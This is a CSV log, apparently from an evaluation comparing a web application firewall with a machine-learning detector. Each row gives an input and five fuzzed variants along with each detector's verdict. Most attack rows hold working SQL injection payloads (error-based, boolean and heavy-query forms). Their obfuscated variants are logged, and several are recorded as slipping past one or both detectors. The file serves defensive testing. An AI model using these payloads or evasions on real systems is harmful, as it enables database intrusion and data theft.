Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
26,2024-12-16T18:39:11.921255,"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau",403,403,200,waf_correct_ml_incorrect," && 1""  )/**/  and elt  (  1889  =  7049<>7050,0x1ce5	 )   and   (  ""kuau""  =  ""kuau",2024-12-16T18:39:15.258560,403,200,waf_correct_ml_incorrect,"  AND  'rcr' NOT LIKE 'rcr#'""  )   and elt  (  (SELECT 1) 
=  7049<>0x1b8a,0x1ce5	 )   and   (  ""kuau""  =  ""kuau",2024-12-16T18:39:20.270533,403,403,both_correct,"  And  'rcr' not like 'rcr#'""  )   and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT 0)<>0x1b8a,0x1ce5	 )  	and   (  ""kuau""  =  ""kuau,",2024-12-16T18:39:26.474707,403,403,both_correct,"  and  'rcr' not like 'rcr#'""  )   and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT (SELECT 'pFz' LIKE 'pFz'))<>0x1b8a,0x1ce5  ) /**/	and   (  ""kuau""  =  ""kuau,:",2024-12-16T18:39:34.136323,403,403,both_correct,"  and  'rcr' not	like 'rcr#'""  )  /**/and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT (SELECT  OR (SELECT 1359)!=1360))<>0x1b8a,0x1ce5  ) /**/	and   (  ""kuau""  =  ""kuau,:(",2024-12-16T18:39:42.796946,403,403,both_correct
27,2024-12-16T18:39:51.945730,22468230j,200,200,200,both_correct,22468230j,2024-12-16T18:39:52.476065,200,200,both_correct,22468230j,2024-12-16T18:39:54.199419,200,200,both_correct,22468230j,2024-12-16T18:39:55.817668,200,200,both_correct,22468230j,2024-12-16T18:39:57.391086,200,200,both_correct,22468230j,2024-12-16T18:39:58.956420,200,200,both_correct
28,2024-12-16T18:40:00.492321,strom.mahieuy4@karldeux.ac,200,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:01.848791,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:04.163341,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:06.533239,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:08.850562,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:11.144430,200,200,both_correct
29,2024-12-16T18:40:13.475466,1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,403,403,200,waf_correct_ml_incorrect,1'   )    )    and 3754/**/ =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )	 ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,2024-12-16T18:40:34.287439,403,200,waf_correct_ml_incorrect,1'   )    )    and 3754/*BiY[*/ =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 3224!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118)  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and   /**/(    (   'opyp'  =  'opyp,2024-12-16T18:40:56.502853,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,537,538)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 3224!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 	)  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and   /**/(    (   'opyp'  =  'opyp",2024-12-16T18:41:20.276911,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,0x219,538)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 5016 IN (5015,5016,5017) else (SELECT 1)!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 
)  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp",2024-12-16T18:41:44.890563,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,0x219, OR 0)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 5016 IN (5015,5016,5017) else (SELECT 1)!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 
)  ||chr  (  3457 NOT LIKE 3458  )  ||chr  (  113/**/ )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (  	 (   'opyp'  =  'opyp",2024-12-16T18:42:10.639424,403,200,waf_correct_ml_incorrect
30,2024-12-16T18:42:37.293133,"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",403,403,200,waf_correct_ml_incorrect,"-7806"" /*Fa""*/ )    )    or   (   OR 0  =  (SELECT 1074) IN (1073,1074,1075)  )  *4906 and    (    ( 	 ""vlrj"" like ""vlrj",2024-12-16T18:42:41.327056,403,403,both_correct,"-7806""   )    )    Or   (   oR 9355=9355  =  (seLECt (SELECT 1074)) in (1073,1074,1075)  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:42:48.036986,403,403,both_correct,"-7806""   )    ) 
  Or  /**/(   oR 9355=9355  =  (seLECt (SELECT 1074)) in (1073,(SELECT 1)!=3040,(SELECT 1075))  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:42:55.592232,403,403,both_correct,"-7806""   )    )/**/   Or  /* kv*/(   oR 9355=9355  =  (seLECt (SELECT 1074)) in ( AND 1,(SELECT 1)!='@'<>'@k',(SELECT (SELECT 1075)))  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:43:03.997932,403,403,both_correct,"- AND 1""   )    )/*@|*/   Or  /* kv*/(   oR 0x248b=9355  =  (seLECt (SELECT 1074)) in ( AND 6505 IN (6504,6505,6506),(SELECT 1)!='@'<>'@k',(SELECT (SELECT 1075)))  )  * AND 1 AnD    (    (   ""vlrj"" lIkE/**/""vlrj",2024-12-16T18:43:13.419024,403,403,both_correct
31,2024-12-16T18:43:24.560177,"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    AS exzo WHeRE 7518  =  7518   (  sEleCt   (  caSE WHEN   (  4587  = 
4587  )   tHen regexp_substring  (  repeat  (  lEfT  (  crypt_key  (  char  (  65  )  ||char  (  (SELECT 1)  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   ElSE char  (  76  )  ||char  (  807=807  )  ||char  (  102  )   or char  (  72  )   End  )   fRoM   (  values  (  0   )    )     )  --",2024-12-16T18:43:42.345413,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    aS exzo WHEre 7518   lIKe   7518   (  selEcT   (  Case wHen   (  4587  =  4587  )   ThEN regexp_substring  (  repeat  (  LEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (SELecT 1)  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  ) /**/ Else char  (  76  )  ||char  (  807='DzvA' LiKe 'DzvA'  )  ||char  (  102  )   OR char  (   OR 0  )   end  )   fROm   (  values  (  0   )    )     )  --",2024-12-16T18:44:01.922781,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    as exzo wHEre 7518   lIkE   7518   (  sELEcT   ( /**/caSe wHeN   (  4587  =  4587  )   THeN regexp_substring  (  repeat  (  lEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (seLECt 1)  )   Or char  (  0x53  )  ,null  )  ,0  )  ,500000000  ) 
,null  ) /*	ZF*/ eLSE char  (  76  )  ||char  (  807='DzvA' LIkE 'DzvA'  )  ||char  (  102  )   OR char  (   OR  or 7542!=7543  )   End  )   fRom   (  values  (  0   )    )     )  --",2024-12-16T18:44:22.683577,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    AS exzo wHeRe (SELect 7518)   likE   7518   (  SeLeCt   (  casE WHen   (  4587  =  4587  )   then regexp_substring  (  repeat  (  lEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (SElECT 1)  )   oR char  (  0x53  )  ,null  )  ,0  )  , AnD 1  ) 	,null  ) /**/ eLSe char  (  76  )  ||char  (  807='DzvA' liKE 'DzvA'  )   OR char  (  102  )   or char  (   OR  oR '4Od'='4Od'!=7543  )   end  )   fROM   (  values  (  0   )    )     )  --",2024-12-16T18:44:44.725579,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    aS exzo whERe (SeLEcT 7518)   LIKe    OR 0   (  sElECt   (  case wHEn   (  4587  =  4587  )   tHEn regexp_substring  (  repeat  (  LEFT  (  crypt_key  (  char  (  0x41  )  ||char  (  (sELEcT 1)  )   Or char  (  0x53  )  ,null  )  ,0  )  , aNd 1  ) 	,null  )   elSe char  (  76  )  ||char  (  3821 In (3820,3821,3822)='DzvA' LIkE 'DzvA'  )   or char  (  0x66  )   or char  (   OR  OR '4Od' like '4Od'!=7543  )   EnD  )   FROm   (  values  (  0   )    ) 
   )  --",2024-12-16T18:45:07.207602,403,200,waf_correct_ml_incorrect
32,2024-12-16T18:45:30.853149,focas@programaciones.com.sz,200,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:32.223346,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:34.626632,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:36.993547,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:39.522955,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:41.989977,200,200,both_correct
33,2024-12-16T18:45:44.356071,"select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--",403,200,403,waf_incorrect_ml_correct,"sELecT * From generate_series  (  9167,9167,CASE when	  (  (SeLeCT 9167)   Like   2273  )   tHeN '>_s'<>'>_sF' ELSE/**/ ANd 1 eND  )   limit 1--",2024-12-16T18:45:49.596761,200,403,waf_incorrect_ml_correct,"SeLeCt * FROM generate_series  (  9167,9167,caSe	whEN	  (  (seLecT  AND 1)   LIke   2273  )   THen '>_s' not like '>_sF' elSE  AnD 0x1 eND  )   limit 1720!=1721--",2024-12-16T18:45:57.418321,200,403,waf_incorrect_ml_correct,"Select * FRom generate_series  ( /**/9167,9167,CAsE whEn	  (  (seLeCT  AND 'et2' NOT LIKE 'et2|')   LIKe    && 1  )   thEN '>_s' not like '>_sF' ElsE  AnD 0x1 ENd  )   limit (SELECT 1720)!=1721--",2024-12-16T18:46:06.030012,200,403,waf_incorrect_ml_correct,"SelECT * fROm generate_series  (
 0x23cf,9167,CASE whEn	  (  (SeLecT  AND 'et2' not like 'et2|')   liKE    && 9362<>9363  )   thEN '>_s' not like '>_sF' eLSe  AND 0x1 eND  )   limit (SElecT (Select 1))!=1721--",2024-12-16T18:46:16.474863,200,403,waf_incorrect_ml_correct,"seLeCt * FROm generate_series  (
 0x23cf, anD 1,CaSe wHeN	  (  (sElECt  ANd 'et2' not like 'et2|')   likE    && 0x2492!=9363  )   Then '>_s' not like '>_sF' eLse  and 0x1 End/**/ ) 	 limit (SElECt (SeLecT 1))!='B='<>'B=8'--",2024-12-16T18:46:27.242240,200,200,both_incorrect
34,2024-12-16T18:46:38.965932,antih sacido,200,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:39.655897,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:41.649471,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:43.681552,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:45.726473,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:47.777130,200,200,both_correct
35,2024-12-16T18:46:49.842254,"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",403,403,403,both_correct,"1,  (  SElECT   (  cAse WHEn   (  3717  = 
3717  )   THen 0x1 ELse  OR 0*  (  sELEcT 'dI' liKE 'dI' FRom master..sysdatabases /**/)   eNd   )    )   ",2024-12-16T18:46:55.992871,403,200,waf_correct_ml_incorrect,"1,  (  SElect   (  caSe when   (  3717  = 	 and 2425 LIKE 2425  )   thEN 0x1/**/eLse  or 0x0*  (  SElEcT 'dI' lIKE 'dI' fRom master..sysdatabases /*+g}H[*/)   END   )    )   ",2024-12-16T18:47:04.072296,403,200,waf_correct_ml_incorrect,"(SeLECt 1),  (  SELECt   (  CaSE WHEn   (  '4)_i%'<>'4)_i%#'   lIKe    anD 2425 lIKE 0x979  )   ThEN 0x1/*wI[*/ElSE  oR 0x0*  (  sELEct 'dI' LIke 'dI' frOM master..sysdatabases  )   END   )    )   ",2024-12-16T18:47:13.142485,403,200,waf_correct_ml_incorrect,"(SelEct (SelecT 1)),/**/ (  sEleCt   (  caSe WhEn   (  ' AND 1)_i%' not like ''[h'='[h')_i%#'   lIKE    AnD 2425 LiKe 0x979  )   thEN 0x1/*t	*/elSE  Or 0x0*  (  SelECT 'dI' likE 'dI' FROm master..sysdatabases  )   eNd   )    )   ",2024-12-16T18:47:23.315953,403,200,waf_correct_ml_incorrect,"(sElEcT
(selecT 1)),/**/ (  SeLECT   (  cASE wHen/**/  (  ' AND (SELECT 0x1))_i%' not like ''[h'='[h')_i%#'   liKE    anD 892 not like 893 liKe 0x979  )   Then 0x1/**/eLsE  oR 0x0*  (  select 'dI' LiKE 'dI' fRom master..sysdatabases  )   ENd   )    )   4S",2024-12-16T18:47:35.183560,403,200,waf_correct_ml_incorrect
36,2024-12-16T18:47:48.024608,undus de lerda,200,200,200,both_correct,"undus/**/de
lerda",2024-12-16T18:47:48.805456,200,200,both_correct,undus de	lerda,2024-12-16T18:47:50.693557,200,200,both_correct,"undus/*~/a{p*/de
lerda",2024-12-16T18:47:52.489681,200,200,both_correct,undus/*~/a{p*/de	lerda,2024-12-16T18:47:54.823571,200,200,both_correct,"undus/*~/a{p*/de
lerda",2024-12-16T18:47:57.046259,200,200,both_correct
37,2024-12-16T18:47:59.243047,mayworth@sms24h.tr,200,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:00.245350,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:02.208278,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:04.220907,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:06.191904,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:08.174400,200,200,both_correct
38,2024-12-16T18:48:10.126793,"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"1""  )   As xylo WheRE 2112   lIKe   (SelEct 1) AND 3715 IN    (    (   char  (  113  )  +char  (/**/ 113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  SelecT   (  caSE WheN   (  3715  =  3715  )   THEn char  (  0x9b1 NOT LIKE 2482  )   elSE char  (  48  )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )
    )  --",2024-12-16T18:48:27.349812,403,200,waf_correct_ml_incorrect,"1""  )   aS xylo wHErE 2112   liKE   (seLeCt 1) AnD 3715 In    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  389 NOT LIKE 390  )  +char  (  113  )  +  (  SELECt
  (  Case when   (  3715   like   (SELECT 3715)  )   ThEn char  (  0x9b1 NOT LIKE  AND 1  )   ELse char  (  48  )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )
    )  --",2024-12-16T18:48:46.874296,403,200,waf_correct_ml_incorrect,"1""  )   as xylo WHERE 2112   lIke   (sELECT 1) ANd 2914<>2915 IN    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  0x185 NOT LIKE 390  )  +char  (  (SelEct 1)  )  +  (  SElect
  (  CAsE WhEn   (  3715   LIkE   (seLeCt 3715)  )   tHEN char  (/**/ 0x9b1 NOT LIKE  And 1  )   ELSE char  (  48  )   End   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:49:07.841231,403,200,waf_correct_ml_incorrect,"1""  )   as xylo wHEre 2112   LIKE   (sEleCT 1) ANd 2914<>2915 IN    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  0x185 NOT LIKE 390  )  +char  (  (SELecT 1)  )  +  (  SeLECT
  (  CaSe WheN   (  3715   LIKE   (sElecT 3715)  )   then char  (  0x9b1 not like  ANd 1  )   ElSE char  (	 48  )   END   )    )   +char  (  0x1930=6448  )  +char  (  122  )  +char  (   Or 0  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:49:29.763565,403,200,waf_correct_ml_incorrect,"1""  )   aS xylo wHere 2112   LIkE   (selEct  anD 1) AND 2914<>2915 in    (    (   char  (  113  )  +char  (  113/**/ )	 +char  (  112  )  +char  (  0x185 not like 390  )  +char  (  (SeLeCT 1)  )  +  (  sELeCT
  (  CasE WheN   (  3715   LIKe   (sELect 3715)  )   then char  (  0x9b1 not like  ANd 1  )   ELsE char  (	 0x30  )   enD   )    )   +char  (  0x1930=6448  )  +char  (  122  )  +char  (   OR 0  )  +char  (  122  )  +char  (  9487 LIKe 9487   )    )     )  --",2024-12-16T18:49:51.806116,403,200,waf_correct_ml_incorrect
39,2024-12-16T18:50:14.743146,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",403,403,403,both_correct,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat /**/(  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *8550 NOT LIKE 8551   )    )   x from information_schema.character_sets group by x 
)  a  )   and   (  ""rwlq""  =  ""rwlq",2024-12-16T18:50:28.255525,403,403,both_correct,"1""  )   or   (  select  OR 0 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *8550 NOT LIKE 9385=9385   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",2024-12-16T18:50:43.691249,403,403,both_correct,"(SELECT 1)""  )   or   (  select  OR 0 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )  /*Pmr}g*/ )     )  ,0x717a767a71,floor  (  rand  (  'MR'!='MR^'  )  *(SELECT 8550) NOT LIKE 9385=9385   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq"" 
=  ""rwlq",2024-12-16T18:50:59.618618,403,403,both_correct,"(sELeCt  AnD 1)""  )   or   (  select  OR 103 NOT LIKE (SELECT 104) from  (  select count  (  *  )  ,concat /**/(  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )  /*V""*/ )     )  ,0x717a767a71,floor  (  rand  (  'MR' not like 'MR^'  )  *(sELECt 8550) NOT LIKE 9385=9385   )    )   x frOm information_schema.character_sets group by x  )  a  )   aND   (  ""rwlq""  =  ""rwlq",2024-12-16T18:51:17.245406,403,403,both_correct,"(SelECt  AND 1)""  )   or   (  select  OR 103 NOT LIKE (SELECT 104) from  (  select count  (  *  )  ,concat /*maA4*/(  0x7171706a71,  (  select   (  elt  (  0x23d5  =  (SELECT 0x1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  'MR' not like 'MR^'  )  *(sELECt 8550) NOT LIKE	24!=(SELECT 1)=9385   )    )   x frOm information_schema.character_sets group by x  )  a  )   aND   (  ""rwlq""  =  ""rwlq",2024-12-16T18:51:36.696948,403,403,both_correct
40,2024-12-16T18:51:56.329032,escocia 197,200,200,200,both_correct,"escocia
'P3B' not like/**/'P3BI'",2024-12-16T18:51:56.967588,200,200,both_correct,"escocia
'P3B'/**/not	like/*(;Kq-*/'P3BI'",2024-12-16T18:51:59.575049,200,200,both_correct,escocia 'P3B' not	like/*(;Kq-*/'P3BI',2024-12-16T18:52:02.868788,200,200,both_correct,"escocia
'P3B'/**/not	like/*(;Kq-*/'P3BI'",2024-12-16T18:52:05.806802,200,200,both_correct,"escocia
'P3B'
not	like/*(;Kq-*/'P3BI'",2024-12-16T18:52:08.765013,200,200,both_correct
41,2024-12-16T18:52:11.563231,1   )    )    as xmac where 7692  =  7692,403,403,200,waf_correct_ml_incorrect,'L'!='LY'  /**/)    )    As xmac wHerE 0x1e0c   liKE   	oR 0,2024-12-16T18:52:13.567024,403,200,waf_correct_ml_incorrect,"'L' not like 'LY'  /*|*/)    )    as xmac whEre 0x1e0c /**/ LIKE   
OR (SELECT  AND 1) LIKE 5058",2024-12-16T18:52:17.440194,403,403,both_correct,"'L' not like 'LY'  /*|*/)    )    AS xmac where 0x1e0c	/**/ Like/**/  
oR (seLEcT  anD  OR 3550!=3551) liKe 0x13c2",2024-12-16T18:52:23.073538,403,200,waf_correct_ml_incorrect,"'L' not like 'LY'  /*|*/)/**/   )    aS xmac wherE 0x1e0c /**/ lIke/**/  
oR (SelEct  ANd  or (SELECT 'Tt'='Tt') not like  AND 1) LIke 0x13c2",2024-12-16T18:52:29.497128,403,403,both_correct,"'L' not like 'LY'  /*|*/)/**/   )   
As xmac WHerE 0x1e0c   LIkE/**/  
Or (SEleCT  AnD  oR (SElEcT 'Tt'='Tt') not like  &&  and 'by'='by') likE 0x13c2",2024-12-16T18:52:37.367865,403,200,waf_correct_ml_incorrect
42,2024-12-16T18:52:45.274904,lue39,200,200,200,both_correct,lue39,2024-12-16T18:52:45.644406,200,200,both_correct,lue39,2024-12-16T18:52:47.000998,200,200,both_correct,lue39,2024-12-16T18:52:48.377923,200,200,both_correct,lue39,2024-12-16T18:52:49.745312,200,200,both_correct,lue39,2024-12-16T18:52:51.128412,200,200,both_correct
43,2024-12-16T18:52:52.493352,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",403,403,200,waf_correct_ml_incorrect,"0x1   )    )    	)   aNd  oR 'c' NOT LIKE 'ct'   like     (  SelECT count /**/(  *  )   FROM domain.domains AS t1,domain.columns aS t2,domain.tables aS t3  )  --",2024-12-16T18:52:58.807851,200,200,both_incorrect,"0x1   )    )    	)   aNd  Or 'c' not like 'ct'	  liKE     (  seLECt count  (  *  )   frOM domain.domains as t1,domain.columns As t2,domain.tables as t3  )  --",2024-12-16T18:53:07.712086,200,200,both_incorrect,"0x1   )    )    	)  /**/ANd  Or 'c' not like 'ct'	  liKE    	(  sElECt count  (  *  )   fRom domain.domains as t1,domain.columns As t2,domain.tables AS t3  )  --",2024-12-16T18:53:16.186800,200,200,both_incorrect,"0x1   )    )    	)  /**/and  Or 'c' not like 'ct'
  lIKE    	(  sELEct count/*\'Ue*/ (  *  )   FROm domain.domains aS t1,domain.columns as t2,domain.tables aS t3  )  --",2024-12-16T18:53:24.805162,200,200,both_incorrect,"0x1   )    )    	)  /*-o*/aND  oR 'c' not like 'ct'	  lIke    	(  SElect count/**/ (  *  )   FROm domain.domains aS t1,domain.columns AS t2,domain.tables/**/as t3  )  --",2024-12-16T18:53:34.009483,200,200,both_incorrect
44,2024-12-16T18:53:42.962724,pineda de la sierra,200,200,200,both_correct,pineda	de/*q5T*/la sierra,2024-12-16T18:53:44.028608,200,200,both_correct,pineda de/**/la/*2AJ*/sierra,2024-12-16T18:53:46.392399,200,200,both_correct,pineda	de/**/la sierra,2024-12-16T18:53:48.842238,200,200,both_correct,"pineda
de/**/la/*r*/sierra",2024-12-16T18:53:51.023978,200,200,both_correct,pineda de la/**/sierra,2024-12-16T18:53:53.325593,200,200,both_correct
